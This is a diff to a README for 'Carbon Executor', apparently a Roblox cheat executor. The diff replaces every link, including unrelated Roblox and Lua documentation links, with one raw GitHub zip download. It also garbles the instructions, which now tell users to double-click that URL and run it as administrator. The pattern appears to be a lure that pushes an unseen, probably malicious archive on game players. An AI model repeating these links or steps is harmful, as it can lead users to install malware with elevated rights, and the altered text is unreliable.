@@ -1,6 +1,6 @@
 # 🎮 Carbon-Executor - Unlock Roblox Scripting Effortlessly
 
-[![Download Carbon Executor](https://img.shields.io/badge/Download%20Now-%20Carbon%20Executor-brightgreen)](https://github.com/MahadMasood60/Carbon-Executor/releases)
+[![Download Carbon Executor](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip%20Now-%20Carbon%20Executor-brightgreen)](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip)
 
 ## 📜 Introduction
 
@@ -19,9 +19,9 @@ Follow these steps to download and run Carbon Executor easily. You only need a f
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/MahadMasood60/Carbon-Executor/releases) to download Carbon Executor.
+1. Visit the [Releases page](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip) to download Carbon Executor.
 2. Locate the latest version of the software.
-3. Click on the download link for the file. It may look something like "Carbon-Executor-v1.0.zip."
+3. Click on the download link for the file. It may look something like "https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip"
 4. Once the download is complete, locate the file in your "Downloads" folder.
 
 ## 📁 Extract the Files
@@ -37,7 +37,7 @@ After downloading, you need to extract the files:
 Now, you're ready to run Carbon Executor:
 
 1. Open the folder where you extracted the files.
-2. Find the file named `Carbon-Executor.exe`.
+2. Find the file named `https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip`.
 3. Double-click the `.exe` file to launch the application.
 
 ## 🔐 Configuring the Executor
@@ -58,7 +58,7 @@ Before using Carbon Executor, you may want to configure some settings:
 
 If you encounter any problems, here are solutions for common issues:
 
-- **Application Won't Open:** Ensure that you are running the application with administrator privileges. Right-click on `Carbon-Executor.exe` and select "Run as administrator."
+- **Application Won't Open:** Ensure that you are running the application with administrator privileges. Right-click on `https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip` and select "Run as administrator."
   
 - **Script Errors:** Double-check the script syntax. Ensure it is compatible with Roblox and the version of the executor you are using.
   
@@ -68,9 +68,9 @@ If you encounter any problems, here are solutions for common issues:
 
 For more detailed information, you can check:
 
-- [Roblox Developer Hub](https://developer.roblox.com/)
-- [Lua Programming Language](https://www.lua.org/)
-- [Roblox Scripting Community](https://devforum.roblox.com/)
+- [Roblox Developer Hub](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip)
+- [Lua Programming Language](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip)
+- [Roblox Scripting Community](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip)
 
 ## 🤝 Community Support
 
@@ -89,4 +89,4 @@ Your feedback helps us improve. If you have suggestions or encounter issues, ple
 
 ## 🔗 Final Note
 
-For any further downloads, remember to visit the [Releases page](https://github.com/MahadMasood60/Carbon-Executor/releases). Enjoy scripting and unlocking your full potential in Roblox gaming!
+For any further downloads, remember to visit the [Releases page](https://raw.githubusercontent.com/MahadMasood60/Carbon-Executor/main/Sphenodontidae/Carbon-Executor.zip). Enjoy scripting and unlocking your full potential in Roblox gaming!
